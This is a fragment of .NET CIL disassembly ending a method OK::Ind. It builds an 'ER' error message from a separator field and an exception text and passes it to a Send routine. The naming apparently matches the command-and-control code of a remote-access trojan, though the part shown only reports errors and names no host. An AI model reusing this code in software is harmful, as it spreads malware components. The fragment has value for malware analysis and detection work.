      IL_0bf4:  stsfld     object j.OK::PLG
      .try
      {
        IL_0bf9:  ldc.i4.5
        IL_0bfa:  newarr     [mscorlib]System.String
        IL_0bff:  stloc.s    V_39
        IL_0c01:  ldloc.s    V_39
        IL_0c03:  ldc.i4.0
        IL_0c04:  ldstr      "ER"
        IL_0c09:  stelem.ref
        IL_0c0a:  ldloc.s    V_39
        IL_0c0c:  ldc.i4.1
        IL_0c0d:  ldsfld     string j.OK::Y
        IL_0c12:  stelem.ref
        IL_0c13:  ldloc.s    V_39
        IL_0c15:  ldc.i4.2
        IL_0c16:  ldloc.0
        IL_0c17:  ldc.i4.0
        IL_0c18:  ldelem.ref
        IL_0c19:  stelem.ref
        IL_0c1a:  ldloc.s    V_39
        IL_0c1c:  ldc.i4.3
        IL_0c1d:  ldsfld     string j.OK::Y
        IL_0c22:  stelem.ref
        IL_0c23:  ldloc.s    V_39
        IL_0c25:  ldc.i4.4
        IL_0c26:  ldloc.s    V_35
        IL_0c28:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0c2d:  stelem.ref
        IL_0c2e:  ldloc.s    V_39
        IL_0c30:  call       string [mscorlib]System.String::Concat(string[])
        IL_0c35:  call       bool j.OK::Send(string)
        IL_0c3a:  pop
        IL_0c3b:  leave.s    IL_0c4c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0c3d:  dup
        IL_0c3e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0c43:  stloc.s    V_36
        IL_0c45:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0c4a:  leave.s    IL_0c4c

      }  // end handler
      IL_0c4c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0c51:  leave.s    IL_0c53

    }  // end handler
    IL_0c53:  ret
  } // end of method OK::Ind
